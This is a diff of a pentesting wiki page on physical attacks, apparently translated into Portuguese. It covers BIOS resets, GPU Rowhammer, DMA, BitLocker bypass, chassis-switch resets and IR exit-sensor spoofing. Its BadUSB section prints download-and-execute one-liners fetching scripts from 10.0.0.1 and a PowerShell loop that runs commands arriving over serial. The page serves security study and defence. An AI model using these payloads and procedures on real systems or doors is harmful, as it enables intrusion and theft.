@@ -1,118 +1,139 @@
-# Ataques Físicos
+# Physical Attacks
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Recuperação de Senha do BIOS e Segurança do Sistema
+## BIOS Password Recovery and System Security
 
-**Redefinir o BIOS** pode ser feito de várias maneiras. A maioria das **placas-mãe** inclui uma **bateria** que, quando removida por cerca de **30 minutos**, irá redefinir as configurações do BIOS, incluindo a senha. Alternativamente, um **jumper na placa-mãe** pode ser ajustado para redefinir essas configurações conectando pinos específicos.
+**Resetting the BIOS** pode ser feito de várias maneiras. A maioria das placas-mãe inclui uma **battery** que, quando removida por cerca de **30 minutos**, redefinirá as configurações da BIOS, incluindo a senha. Como alternativa, um **jumper on the motherboard** pode ser ajustado para redefinir essas configurações conectando pinos específicos.
 
-Para situações em que ajustes de hardware não são possíveis ou práticos, **ferramentas de software** oferecem uma solução. Executar um sistema a partir de um **Live CD/USB** com distribuições como **Kali Linux** fornece acesso a ferramentas como **_killCmos_** e **_CmosPWD_**, que podem auxiliar na recuperação da senha do BIOS.
+Para situações em que ajustes de hardware não são possíveis ou práticos, **software tools** oferecem uma solução. Executar um sistema a partir de um **Live CD/USB** com distribuições como **Kali Linux** fornece acesso a ferramentas como **_killCmos_** e **_CmosPWD_**, que podem ajudar na recuperação da senha da BIOS.
 
-Nos casos em que a senha do BIOS é desconhecida, digitá-la incorretamente **três vezes** normalmente resultará em um código de erro. Esse código pode ser usado em sites como [https://bios-pw.org](https://bios-pw.org) para potencialmente recuperar uma senha utilizável.
+Em casos em que a senha da BIOS é desconhecida, inseri-la incorretamente **three times** normalmente resultará em um código de erro. Esse código pode ser usado em sites como [https://bios-pw.org](https://bios-pw.org) para potencialmente recuperar uma senha utilizável.
 
-### Segurança UEFI
+### UEFI Security
 
-Para sistemas modernos que usam **UEFI** em vez do BIOS tradicional, a ferramenta **chipsec** pode ser utilizada para analisar e modificar as configurações do UEFI, incluindo a desativação do **Secure Boot**. Isso pode ser feito com o seguinte comando:
+Para sistemas modernos que usam **UEFI** em vez da BIOS tradicional, a ferramenta **chipsec** pode ser utilizada para analisar e modificar configurações UEFI, incluindo a desativação do **Secure Boot**. Isso pode ser feito com o seguinte comando:
 ```bash
 python chipsec_main.py -module exploits.secure.boot.pk
 ```
 ---
 
-## RAM Analysis and Cold Boot Attacks
+## Análise de RAM e Ataques Cold Boot
 
-RAM retém dados brevemente após a energia ser cortada, normalmente por **1 a 2 minutos**. Essa persistência pode ser estendida para **10 minutos** aplicando substâncias frias, como nitrogênio líquido. Durante esse período estendido, um **memory dump** pode ser criado usando ferramentas como **dd.exe** e **volatility** para análise.
-
----
-
-## Direct Memory Access (DMA) Attacks
-
-**INCEPTION** é uma ferramenta projetada para **manipulação física da memória** através de DMA, compatível com interfaces como **FireWire** e **Thunderbolt**. Permite contornar procedimentos de login patchando a memória para aceitar qualquer senha. No entanto, é ineficaz contra sistemas **Windows 10**.
+A RAM retém dados por pouco tempo após a energia ser cortada, normalmente por **1 a 2 minutos**. Essa persistência pode ser estendida para **10 minutos** aplicando substâncias frias, como nitrogênio líquido. Durante esse período estendido, um **memory dump** pode ser criado usando ferramentas como **dd.exe** e **volatility** para análise.
 
 ---
 
-## Live CD/USB for System Access
+## GPU Rowhammer Contra Page Tables
 
-Substituir binários do sistema como **_sethc.exe_** ou **_Utilman.exe_** por uma cópia de **_cmd.exe_** pode fornecer um prompt de comando com privilégios de sistema. Ferramentas como **chntpw** podem ser usadas para editar o arquivo **SAM** de uma instalação Windows, permitindo alterar senhas.
+Ataques modernos de GPU Rowhammer tornam-se muito mais úteis quando têm como alvo **GPU virtual-memory metadata** em vez de buffers comuns. Trabalhos recentes em **GDDR6 NVIDIA Ampere GPUs** mostram que um atacante executando código CUDA sem privilégios pode construir padrões de hammering específicos para GPU, usar **memory massaging** para colocar estruturas de paging em rows vulneráveis e então flip bits no **last-level page table** ou em um **page directory** intermediário. Assim que uma única translation entry é corrompida, o atacante pode iniciar **arbitrary GPU memory read/write** e então pivotar para a compromise do host.
+
+### Padrão de Exploração
+
+1. **Profile hammerable rows** em GDDR6 e construa padrões de hammering sensíveis a refresh / não uniformes que contornem mitigações in-DRAM.
+2. **Massage GPU allocations** para que o driver coloque estruturas de page-translation em localizações físicas hammerable em vez de mantê-las no pool protegido padrão. Na prática, isso pode significar esgotar a região de page-table de low-memory e fazer spray de grandes UVM mappings sparse com strides controlados.
+3. **Flip translation metadata** como **PFN** ou bits relacionados à aperture dentro de uma page-table / page-directory entry para que a virtual page controlada pelo atacante resolva para páginas de page-table, arbitrary GPU memory, ou mapeamentos de system visíveis ao host.
+4. Reutilize o mapeamento forjado para reescrever entradas adicionais de translation e escalar para **arbitrary GPU memory read/write** entre contextos de GPU.
+
+### Pivot para o Host e Mitigações
+
+- Com **IOMMU disabled**, mapeamentos forjados de system aperture podem expor arbitrary **host physical memory** à GPU, transformando a primitive da GPU em compromise total do host.
+- **GDDRHammer** mira entradas de last-level page-table, enquanto **GeForge** mostra que corromper um nível de page-directory pode ser mais fácil porque um bit flip pode redirecionar uma subtree de translation maior. Não trate apenas uma camada de paging como crítica para a segurança.
+- **IOMMU** ainda importa porque bloqueia o caminho direto de arbitrary-host-memory usado por GDDRHammer/GeForge, mas **não é uma mitigação completa**. **GPUBreach** mostra um pivot de segunda etapa em que o atacante corrompe buffers da CPU graváveis pela GPU, de propriedade do driver, e então aciona bugs de memory-safety do driver NVIDIA para obter uma kernel write primitive e uma **root shell** mesmo com IOMMU habilitado.
+- **System-level ECC** é uma medida prática de hardening em GPUs workstation/server suportadas. GPUs de consumo sem ECC expõem uma superfície de defesa mais fraca.
+- Esses ataques não são puramente teóricos: **GeForge** relatou **1.171** bit flips em uma RTX 3060 e **202** em uma RTX A6000, o suficiente para construir uma cadeia funcional de escalation de privilégios no host.
+
+---
+
+## Ataques de Direct Memory Access (DMA)
+
+**INCEPTION** é uma ferramenta projetada para **physical memory manipulation** via DMA, compatível com interfaces como **FireWire** e **Thunderbolt**. Ela permite burlar procedimentos de login patchando a memória para aceitar qualquer senha. No entanto, é ineficaz contra sistemas **Windows 10**.
+
+---
+
+## Live CD/USB para Acesso ao Sistema
+
+Substituir binários do sistema como **_sethc.exe_** ou **_Utilman.exe_** por uma cópia de **_cmd.exe_** pode fornecer um command prompt com privilégios de sistema. Ferramentas como **chntpw** podem ser usadas para editar o arquivo **SAM** de uma instalação do Windows, permitindo alterações de senha.
 
 **Kon-Boot** é uma ferramenta que facilita o login em sistemas Windows sem conhecer a senha, modificando temporariamente o kernel do Windows ou o UEFI. Mais informações podem ser encontradas em [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).
 
 ---
 
-## Handling Windows Security Features
+## Manipulação de Windows Security Features
 
 ### Boot and Recovery Shortcuts
 
-- **Supr**: Acessar as configurações do BIOS.  
-- **F8**: Entrar no modo Recovery.  
-- Pressionar **Shift** após o banner do Windows pode contornar o autologon.
+- **Supr**: Acessa as configurações da BIOS.
+- **F8**: Entra no modo Recovery.
+- Pressionar **Shift** após o banner do Windows pode burlar o autologon.
 
-### BAD USB Devices
+### Dispositivos BAD USB
 
-Dispositivos como **Rubber Ducky** e **Teensyduino** servem como plataformas para criar dispositivos **bad USB**, capazes de executar payloads pré-definidos quando conectados a um computador alvo.
+Dispositivos como **Rubber Ducky** e **Teensyduino** servem como plataformas para criar dispositivos **bad USB**, capazes de executar payloads predefinidos quando conectados a um computador alvo.
 
 ### Volume Shadow Copy
 
-Privilégios de administrador permitem a criação de cópias de arquivos sensíveis, incluindo o arquivo **SAM**, através do **PowerShell**.
+Privilégios de administrador permitem a criação de cópias de arquivos sensíveis, incluindo o arquivo **SAM**, via PowerShell.
 
-## BadUSB / HID Implant Techniques
+## BadUSB / Técnicas de HID Implant
 
-### Wi-Fi managed cable implants
+### Implantes de cabo gerenciados por Wi-Fi
 
-- Implantes baseados em **ESP32-S3** como **Evil Crow Cable Wind** se escondem dentro de cabos **USB-A→USB-C** ou **USB-C↔USB-C**, enumeram-se como um teclado USB e expõem sua stack de **C2** via Wi‑Fi. O operador só precisa alimentar o cabo a partir do host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789`, e navegar até [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para acessar a interface HTTP embarcada.
-- A UI do browser fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Payloads armazenados são etiquetados por OS, layouts de teclado são trocados dinamicamente, e strings de VID/PID podem ser alteradas para imitar periféricos conhecidos.
-- Como o **C2** vive dentro do cabo, um telefone pode preparar payloads, disparar a execução e gerenciar credenciais Wi‑Fi sem tocar no OS do host — ideal para intrusões físicas de curta duração.
+- Implantes baseados em ESP32-S3 como o **Evil Crow Cable Wind** se escondem dentro de cabos USB-A→USB-C ou USB-C↔USB-C, se enumeram apenas como um teclado USB e expõem seu stack de C2 via Wi-Fi. O operador só precisa energizar o cabo a partir do host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para chegar à interface HTTP embarcada.
+- A interface do navegador fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Os payloads armazenados são marcados por OS, os layouts de teclado são alternados dinamicamente, e as strings VID/PID podem ser alteradas para imitar periféricos conhecidos.
+- Como o C2 vive dentro do cabo, um telefone pode preparar payloads, disparar a execução e gerenciar credenciais de Wi-Fi sem tocar o OS do host — ideal para intrusões físicas de curta permanência.
 
-### OS-aware AutoExec payloads
+### Payloads AutoExec cientes do OS
 
-- Regras AutoExec vinculam um ou mais payloads para disparar imediatamente após a enumeração USB. O implante realiza um fingerprinting leve do OS e seleciona o script correspondente.
-- Exemplo de workflow:
+- As regras AutoExec vinculam um ou mais payloads para serem executados imediatamente após a enumeração USB. O implant faz um fingerprinting leve do OS e seleciona o script correspondente.
+- Fluxo de trabalho de exemplo:
 - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
 - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
-- Como a execução é não assistida, simplesmente trocar um cabo de carga pode alcançar o acesso inicial “plug-and-pwn” no contexto do usuário logado.
+- Como a execução é desassistida, simplesmente trocar um cabo de carregamento pode obter acesso inicial “plug-and-pwn” sob o contexto do usuário autenticado.
 
-### HID-bootstrapped remote shell over Wi-Fi TCP
+### Remote shell via Wi-Fi TCP iniciada por HID
 
-1. **Keystroke bootstrap:** Um payload armazenado abre um console e cola um loop que executa o que chegar no novo **USB serial device**. Uma variante mínima para Windows é:
+1. **Keystroke bootstrap:** Um payload armazenado abre um console e cola um loop que executa qualquer coisa que chegue no novo USB serial device. Uma variante mínima para Windows é:
 ```powershell
 $port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
 $port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
 ```
-2. **Cable bridge:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 lança um cliente TCP (Python script, Android APK, or desktop executable) de volta para o operador. Quaisquer bytes digitados na sessão TCP são encaminhados para o serial loop acima, proporcionando execução remota de comandos mesmo em hosts air-gapped. A saída é limitada, então os operadores tipicamente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais, etc.).
+2. **Cable bridge:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (Python script, Android APK, or desktop executable) de volta para o operador. Qualquer byte digitado na sessão TCP é encaminhado para o loop serial acima, permitindo execução remota de comandos até mesmo em hosts air-gapped. A saída é limitada, então os operadores normalmente executam blind commands (criação de conta, staging de ferramentas adicionais, etc.).
 
-### Superfície de atualização OTA via HTTP
+### HTTP OTA update surface
 
-- A mesma web stack geralmente expõe atualizações de firmware não autenticadas. Evil Crow Cable Wind escuta em `/update` e grava qualquer binário enviado:
+- O mesmo web stack normalmente expõe atualizações de firmware sem autenticação. Evil Crow Cable Wind escuta em `/update` e grava qualquer binary que seja enviado:
 ```bash
 curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
 ```
-- Operadores de campo podem hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement sem abrir o cabo, permitindo que o implant pivot para novas capacidades enquanto ainda está conectado ao host alvo.
+- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.
 
-## Contornando a criptografia do BitLocker
+## Bypass de Criptografia do BitLocker
 
-BitLocker encryption pode potencialmente ser bypassed se a **recovery password** for encontrada dentro de um despejo de memória (**MEMORY.DMP**). Ferramentas como **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** podem ser utilizadas para esse fim.
+A criptografia do BitLocker pode potencialmente ser contornada se a **senha de recuperação** for encontrada dentro de um arquivo de dump de memória (**MEMORY.DMP**). Ferramentas como **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** podem ser utilizadas para esse propósito.
 
 ---
 
 ## Engenharia Social para Adição de Recovery Key
 
-Uma nova recovery key do BitLocker pode ser adicionada através de táticas de engenharia social, convencendo um usuário a executar um comando que adiciona uma nova recovery key composta por zeros, simplificando assim o processo de descriptografia.
+Uma nova recovery key do BitLocker pode ser adicionada por meio de táticas de engenharia social, convencendo um usuário a executar um comando que adiciona uma nova recovery key composta por zeros, simplificando assim o processo de decriptação.
 
 ---
 
-## Explorando Chassis Intrusion / Maintenance Switches para o reset de fábrica do BIOS
+## Explorando Chassis Intrusion / Maintenance Switches para Factory-Reset da BIOS
 
-Muitos laptops modernos e desktops small-form-factor incluem um **chassis-intrusion switch** que é monitorado pelo Embedded Controller (EC) e pelo firmware BIOS/UEFI. Enquanto o propósito primário do switch é disparar um alerta quando um dispositivo é aberto, fabricantes às vezes implementam um **atalho de recuperação não documentado** que é acionado quando o switch é alternado em um padrão específico.
+Muitos laptops modernos e desktops de fator de forma pequeno incluem um **chassis-intrusion switch** que é monitorado pelo Embedded Controller (EC) e pelo firmware da BIOS/UEFI. Embora o objetivo principal do switch seja emitir um alerta quando um dispositivo é aberto, os fabricantes às vezes implementam um **atalho de recuperação não documentado** que é acionado quando o switch é alternado em um padrão específico.
 
-### How the Attack Works
+### Como o Ataque Funciona
 
-1. O switch está ligado a uma **GPIO interrupt** no EC.
-2. O firmware rodando no EC acompanha o **tempo e o número de pressionamentos**.
-3. Quando um padrão hard-coded é reconhecido, o EC invoca uma rotina *mainboard-reset* que **apaga o conteúdo do NVRAM/CMOS do sistema**.
-4. No próximo boot, o BIOS carrega valores padrão – **a senha de supervisor, as Secure Boot keys, e toda configuração personalizada são apagadas**.
+1. O switch está ligado a uma **interrupção GPIO** no EC.
+2. O firmware executado no EC acompanha o **tempo e o número de acionamentos**.
+3. Quando um padrão codificado é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo do NVRAM/CMOS do sistema**.
+4. Na próxima inicialização, a BIOS carrega valores padrão – **a senha do supervisor, as chaves do Secure Boot e toda configuração personalizada são apagadas**.
 
-> Uma vez que o Secure Boot está desativado e a senha do firmware se foi, o atacante pode simplesmente inicializar qualquer imagem de OS externa e obter acesso irrestrito aos discos internos.
+> Assim que o Secure Boot é desativado e a senha do firmware desaparece, o atacante pode simplesmente inicializar qualquer imagem externa de sistema operacional e obter acesso irrestrito às unidades internas.
 
-### Real-World Example – Framework 13 Laptop
+### Exemplo do Mundo Real – Framework 13 Laptop
 
 O atalho de recuperação para o Framework 13 (11th/12th/13th-gen) é:
 ```text
@@ -120,51 +141,56 @@ Press intrusion switch  →  hold 2 s
 Release                 →  wait 2 s
 (repeat the press/release cycle 10× while the machine is powered)
 ```
-Após o décimo ciclo o EC define uma flag que instrui a BIOS a apagar o NVRAM no próximo reboot. Todo o procedimento leva ~40 s e requer **apenas uma chave de fenda**.
+Após o décimo ciclo, o EC define uma flag que instrui o BIOS a apagar a NVRAM no próximo reboot. Todo o procedimento leva ~40 s e requer **nada além de uma chave de fenda**.
 
 ### Generic Exploitation Procedure
 
-1. Ligue ou faça suspend-resume no alvo para que o EC esteja em execução.
-2. Remova a tampa inferior para expor o interruptor de intrusão/manutenção.
-3. Reproduza o padrão de alternância específico do fornecedor (consulte documentação, fóruns ou reverse-engineer o firmware do EC).
-4. Remonte e reinicie – as proteções do firmware devem estar desativadas.
-5. Inicialize a partir de um live USB (e.g. Kali Linux) e execute o post-exploitation usual (credential dumping, exfiltração de dados, implantação de binários EFI maliciosos, etc.).
+1. Ligue ou suspend-resume o target para que o EC esteja em execução.
+2. Remova a tampa inferior para expor o switch de intrusion/maintenance.
+3. Reproduza o padrão de alternância específico do vendor (consulte documentação, fóruns ou reverse-engineer o firmware do EC).
+4. Remonte e reboot – as proteções de firmware devem estar desativadas.
+5. Inicie um live USB (por exemplo, Kali Linux) e faça a usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).
 
 ### Detection & Mitigation
 
-* Registre eventos de intrusão no chassi no console de gestão do OS e correlacione com resets inesperados da BIOS.
-* Utilize **selos que evidenciem violação** nos parafusos/tampas para detectar abertura.
+* Registre eventos de chassis-intrusion no console de gerenciamento do OS e correlacione com resets inesperados de BIOS.
+* Empregue **tamper-evident seals** nos parafusos/capas para detectar abertura.
 * Mantenha dispositivos em **áreas fisicamente controladas**; assuma que acesso físico equivale a comprometimento total.
-* Quando disponível, desative o recurso do fornecedor “maintenance switch reset” ou exija uma autorização criptográfica adicional para resets de NVRAM.
+* Onde disponível, desative o recurso do vendor “maintenance switch reset” ou exija uma autorização criptográfica adicional para resets de NVRAM.
 
 ---
 
 ## Covert IR Injection Against No-Touch Exit Sensors
 
 ### Sensor Characteristics
-- Sensores comerciais “wave-to-exit” emparelham um emissor LED near-IR com um módulo receptor estilo TV-remote que só relata logic high depois de ver múltiplos pulsos (~4–10) do carrier correto (≈30 kHz).
-- Uma cobertura plástica bloqueia o emissor e o receptor de se verem diretamente, então o controlador assume que qualquer carrier validado veio de uma reflexão próxima e aciona um relay que abre a fechadura da porta.
-- Uma vez que o controlador acredita que um alvo está presente, ele frequentemente muda o envelope de modulação de saída, mas o receptor continua aceitando qualquer burst que corresponda ao carrier filtrado.
+- Sensores commodity “wave-to-exit” emparelham um emissor LED near-IR com um módulo receptor estilo controle remoto de TV que só reporta logic high depois de ter visto múltiplos pulsos (~4–10) do carrier correto (≈30 kHz).
+- Uma proteção plástica bloqueia o emissor e o receptor de se verem diretamente, então o controller assume que qualquer carrier validado veio de uma reflexão próxima e aciona um relay que abre o door strike.
+- Uma vez que o controller acredita que um target está presente, ele frequentemente altera a outbound modulation envelope, mas o receiver continua aceitando qualquer burst que corresponda ao carrier filtrado.
 
 ### Attack Workflow
-1. **Capture the emission profile** – prenda um analisador lógico nas trilhas do controlador para gravar tanto as formas de onda pré-detecção quanto as pós-detecção que dirigem o LED IR interno.
-2. **Replay only the “post-detection” waveform** – remova/ignore o emissor original e conduza um LED IR externo com o padrão já disparado desde o início. Como o receptor só se importa com contagem/frequência de pulsos, ele trata o carrier falsificado como uma reflexão genuína e ativa a linha do relay.
-3. **Gate the transmission** – transmita o carrier em rajadas ajustadas (e.g., dezenas de milissegundos ligado, similar desligado) para entregar a contagem mínima de pulsos sem saturar o AGC do receptor ou sua lógica de tratamento de interferência. Emissão contínua dessensibiliza rapidamente o sensor e impede que o relay dispare.
+1. **Capture o emission profile** – conecte um logic analyser aos pinos do controller para registrar tanto as waveforms pre-detection quanto post-detection que dirigem o IR LED interno.
+2. **Replay only the “post-detection” waveform** – remova/ignore o emissor padrão e dirija um IR LED externo com o padrão já acionado desde o início. Como o receiver só se importa com pulse count/frequency, ele trata o carrier falsificado como uma reflexão genuína e afirma a linha do relay.
+3. **Gate the transmission** – transmita o carrier em bursts ajustados (por exemplo, dezenas de milissegundos ligado, intervalo semelhante desligado) para entregar o mínimo pulse count sem saturar o AGC do receiver ou a lógica de tratamento de interferência. Emissão contínua rapidamente dessensibiliza o sensor e impede o disparo do relay.
 
 ### Long-Range Reflective Injection
-- Substituir o LED de bancada por um diodo IR de alta potência, driver MOSFET e óptica de foco permite acionar de forma confiável a ~6 m de distância.
-- O atacante não precisa de linha de visão direta para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de porta visíveis através de vidro permite que energia refletida entre no campo de visão de ~30° e imite um aceno de mão próximo.
-- Como os receptores esperam apenas reflexões fracas, um feixe externo muito mais forte pode ricochetear em múltiplas superfícies e ainda permanecer acima do limiar de detecção.
+- Substituir o LED de bancada por um diodo IR de alta potência, driver MOSFET e optics de foco permite disparo confiável de ~6 m de distância.
+- O attacker não precisa de line-of-sight para a abertura do receiver; apontar o feixe para paredes internas, prateleiras ou door frames visíveis através de glass permite que a energia refletida entre no field of view de ~30° e imite um wave de mão a curta distância.
+- Como os receivers esperam apenas reflections fracas, um feixe externo muito mais forte pode ricochetear em múltiplas superfícies e ainda permanecer acima do detection threshold.
 
 ### Weaponised Attack Torch
-- Embutir o driver dentro de uma lanterna comercial esconde a ferramenta à vista. Troque o LED visível por um LED IR de alta potência compatível com a banda do receptor, adicione um ATtiny412 (ou similar) para gerar rajadas de ≈30 kHz, e use um MOSFET para drenar a corrente do LED.
-- Uma lente telescópica de zoom estreita o feixe para alcance/precisão, enquanto um motor de vibração controlado pelo MCU fornece confirmação háptica de que a modulação está ativa sem emitir luz visível.
-- Variar entre vários padrões de modulação armazenados (frequências de carrier e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensores rebrandadas, permitindo ao operador varrer superfícies refletivas até o relay clicar audivelmente e a porta liberar.
+- Integrar o driver dentro de uma lanterna comercial esconde a ferramenta à vista de todos. Troque o LED visível por um IR LED de alta potência compatível com a band do receiver, adicione um ATtiny412 (ou similar) para gerar os bursts de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
+- Uma lente zoom telescópica estreita o feixe para range/precision, enquanto um motor de vibração sob controle do MCU fornece confirmação háptica de que a modulation está ativa sem emitir luz visível.
+- Ciclar por vários stored modulation patterns (frequências de carrier e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensors renomeadas, permitindo ao operator varrer superfícies refletivas até que o relay faça um clique audível e a door seja destravada.
 
 ---
 
 ## References
 
+- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
+- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
+- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
+- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
+- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
 - [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
 - [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
 - [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
